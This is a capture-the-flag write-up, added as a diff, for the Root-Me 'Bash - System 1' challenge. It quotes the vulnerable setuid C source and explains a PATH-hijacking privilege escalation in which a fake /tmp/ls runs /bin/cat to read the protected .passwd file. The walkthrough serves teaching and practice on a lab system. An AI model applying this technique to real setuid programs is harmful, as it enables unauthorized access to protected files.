@@ -1,0 +1,52 @@
+Task on root-me: https://www.root-me.org/en/Challenges/App-Script/Bash-System-1
+Video solution: https://youtu.be/4-FOKUe7zYs
+
+Source code:
+/*******************************************/
+#include <stdlib.h>
+#include <stdio.h>
+ 
+/* gcc -m32 -o ch11 ch11.c */
+ 
+int main(void)
+{
+        system("ls /challenge/app-script/ch11/.passwd");
+        return 0;
+}
+
+/******************************************/
+
+
+./ch11: setuid ELF 32-bit LSB executable
+
+So, we have source code and binary with setuid enabled.
+Compiled binary execute ls command as root, but we need cat command to see what in .passwd file.
+If you look at this code
+   system("ls /challenge/app-script/ch11/.passwd");
+you can see that main vulnerability is $PATH variable:
+
+$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games/
+
+And if we create file in /tmp folder with name ls and content
+
+#!/bin/bash
+/bin/cat
+
+Give him execute permission, then clean $PATH variable and export env PATH="/tmp", owr binary try to find executable ls command
+in $PATH and find /tmp/ls that execute /bin/cat. After this manipulations we can imagine than source code look like:
+
+/*******************************************/
+#include <stdlib.h>
+#include <stdio.h>
+ 
+/* gcc -m32 -o ch11 ch11.c */
+ 
+int main(void)
+{
+        system("/tmp/ls /challenge/app-script/ch11/.passwd");
+	/*/tmp/ls execute /bin/cat*/
+        return 0;
+}
+
+/******************************************/
